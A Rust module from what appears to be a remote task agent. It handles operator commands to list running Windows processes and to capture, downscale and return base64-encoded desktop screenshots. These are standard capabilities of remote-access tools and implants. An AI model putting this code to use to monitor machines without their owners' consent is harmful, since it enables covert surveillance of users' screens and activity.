//! System Operations - process list, screenshot handlers for built-in commands

use crate::protocol::AgentMessage;
use std::sync::mpsc::Sender;

/// Check if a command is a built-in system operation
pub fn is_sys_op(command: &str) -> bool {
    matches!(command, "ps" | "screenshot")
}

/// Dispatch system operation to the appropriate handler
pub fn handle(task_id: &str, command: &str, sender: &Sender<AgentMessage>) {
    match command {
        "ps" => handle_ps(task_id, sender),
        "screenshot" => handle_screenshot(task_id, sender),
        _ => {
            let _ = sender.send(fail(task_id, format!("unknown sys op: {command}")));
        }
    }
}

/// Handle `ps` command: list running processes
fn handle_ps(task_id: &str, sender: &Sender<AgentMessage>) {
    #[cfg(windows)]
    {
        use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
        use windows_sys::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
        };

        let mut result = String::new();
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                let _ = sender.send(fail(task_id, "Failed to create process snapshot".to_string()));
                return;
            }

            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let name_end = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                    let name = String::from_utf16_lossy(&entry.szExeFile[..name_end]);
                    result.push_str(&format!(
                        "\"{}\",{},{}\n",
                        name, entry.th32ProcessID, entry.cntThreads
                    ));
                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }

            CloseHandle(snapshot);
        }

        let _ = sender.send(AgentMessage::TaskResult {
            task_id: task_id.to_string(),
            success: true,
            output: result.trim().to_string(),
        });
    }
    #[cfg(not(windows))]
    {
        let _ = sender.send(fail(task_id, "ps not supported on this platform".to_string()));
    }
}

/// Handle `screenshot` command: capture screen
///
/// Uses Win32 GDI to capture the screen and encodes as PNG.
/// Wrapped with a 30-second timeout to prevent GDI calls from blocking
/// the agent indefinitely (e.g. in headless/remote desktop environments).
fn handle_screenshot(task_id: &str, sender: &Sender<AgentMessage>) {
    #[cfg(windows)]
    {
        use std::sync::mpsc;
        use std::time::Duration;

        let (tx, rx) = mpsc::channel();
        let tid = task_id.to_string();

        // Run GDI capture in a dedicated thread with timeout
        std::thread::spawn(move || {
            let result = std::panic::catch_unwind(|| unsafe { capture_screen_to_png() });
            let _ = tx.send(match result {
                Ok(inner) => inner,
                Err(_) => Err("screenshot panicked (GDI call failed)".to_string()),
            });
        });

        match rx.recv_timeout(Duration::from_secs(30)) {
            Ok(Ok(png_data)) => {
                use base64::{engine::general_purpose::STANDARD, Engine as _};
                let b64 = STANDARD.encode(&png_data);
                let _ = sender.send(AgentMessage::TaskResult {
                    task_id: tid,
                    success: true,
                    output: b64,
                });
            }
            Ok(Err(e)) => {
                let _ = sender.send(fail(&tid, format!("screenshot failed: {e}")));
            }
            Err(_timeout) => {
                let _ = sender.send(fail(&tid, "screenshot timed out after 30s".to_string()));
            }
        }
    }
    #[cfg(not(windows))]
    {
        let _ = sender.send(fail(task_id, "screenshot not supported on this platform".to_string()));
    }
}

/// Maximum screenshot dimension (width or height). Larger screens are
/// downscaled to keep the resulting PNG under ~1 MB after base64 encoding.
#[cfg(windows)]
const SCREENSHOT_MAX_DIM: i32 = 800;

#[cfg(windows)]
unsafe fn capture_screen_to_png() -> Result<Vec<u8>, String> {
    use windows_sys::Win32::Graphics::Gdi::*;
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        GetSystemMetrics, SetProcessDPIAware, SM_CXSCREEN, SM_CYSCREEN,
    };

    // Ensure DPI awareness for correct full-screen capture on high-DPI displays
    SetProcessDPIAware();

    let width = GetSystemMetrics(SM_CXSCREEN);
    let height = GetSystemMetrics(SM_CYSCREEN);
    if width <= 0 || height <= 0 {
        return Err("Invalid screen dimensions".to_string());
    }

    let hdc_screen = GetDC(std::ptr::null_mut());
    if hdc_screen.is_null() {
        return Err("GetDC failed: no desktop session available".to_string());
    }
    let hdc_mem = CreateCompatibleDC(hdc_screen);
    if hdc_mem.is_null() {
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        return Err("CreateCompatibleDC failed".to_string());
    }
    let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
    if hbitmap.is_null() {
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        return Err("CreateCompatibleBitmap failed".to_string());
    }
    let old_bmp = SelectObject(hdc_mem, hbitmap as *mut _);

    let copied = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
    if copied == 0 {
        SelectObject(hdc_mem, old_bmp);
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        return Err("BitBlt failed".to_string());
    }

    let mut bmi: BITMAPINFO = std::mem::zeroed();
    bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height; // top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    let row_size = (width * 4) as usize;
    let buf_size = row_size * height as usize;
    let mut pixels: Vec<u8> = vec![0u8; buf_size];

    let dib_result = GetDIBits(
        hdc_mem, hbitmap, 0, height as u32,
        pixels.as_mut_ptr() as *mut _,
        &mut bmi, DIB_RGB_COLORS,
    );

    SelectObject(hdc_mem, old_bmp);
    DeleteObject(hbitmap as *mut _);
    DeleteDC(hdc_mem);
    ReleaseDC(std::ptr::null_mut(), hdc_screen);

    if dib_result == 0 {
        return Err("GetDIBits failed".to_string());
    }

    // Downscale if either dimension exceeds the limit.  Nearest-neighbor
    // sampling on the BGRA buffer — no extra allocation for intermediate
    // RGBA conversion on the full-size image.
    let (out_w, out_h, pixels) = if width > SCREENSHOT_MAX_DIM || height > SCREENSHOT_MAX_DIM {
        let scale_w = SCREENSHOT_MAX_DIM as f64 / width as f64;
        let scale_h = SCREENSHOT_MAX_DIM as f64 / height as f64;
        let scale = scale_w.min(scale_h);
        let ow = ((width as f64 * scale) as i32).max(1);
        let oh = ((height as f64 * scale) as i32).max(1);
        let scaled = downscale_bgra(&pixels, width, height, ow, oh);
        (ow as u32, oh as u32, scaled)
    } else {
        (width as u32, height as u32, pixels)
    };

    // Convert BGRA -> RGBA
    let mut rgba = pixels;
    for chunk in rgba.chunks_exact_mut(4) {
        chunk.swap(0, 2);
    }

    encode_png(out_w, out_h, &rgba)
}

/// Nearest-neighbor downscale on a BGRA pixel buffer.
#[cfg(windows)]
fn downscale_bgra(
    src: &[u8],
    src_w: i32,
    src_h: i32,
    dst_w: i32,
    dst_h: i32,
) -> Vec<u8> {
    let mut dst = vec![0u8; (dst_w * dst_h * 4) as usize];
    for dy in 0..dst_h {
        let sy = (dy as f64 * src_h as f64 / dst_h as f64) as i32;
        let sy = sy.min(src_h - 1);
        for dx in 0..dst_w {
            let sx = (dx as f64 * src_w as f64 / dst_w as f64) as i32;
            let sx = sx.min(src_w - 1);
            let src_off = ((sy * src_w + sx) * 4) as usize;
            let dst_off = ((dy * dst_w + dx) * 4) as usize;
            dst[dst_off..dst_off + 4].copy_from_slice(&src[src_off..src_off + 4]);
        }
    }
    dst
}

#[cfg(windows)]
fn encode_png(width: u32, height: u32, rgba_data: &[u8]) -> Result<Vec<u8>, String> {
    let mut buf = Vec::new();
    {
        let writer = std::io::BufWriter::new(&mut buf);
        let mut encoder = png::Encoder::new(writer, width, height);
        encoder.set_color(png::ColorType::Rgba);
        encoder.set_depth(png::BitDepth::Eight);
        encoder.set_compression(png::Compression::Default);
        let mut writer = encoder.write_header().map_err(|e| e.to_string())?;
        writer.write_image_data(rgba_data).map_err(|e| e.to_string())?;
    }
    Ok(buf)
}

fn fail(task_id: &str, detail: String) -> AgentMessage {
    AgentMessage::TaskResult {
        task_id: task_id.to_string(),
        success: false,
        output: detail,
    }
}
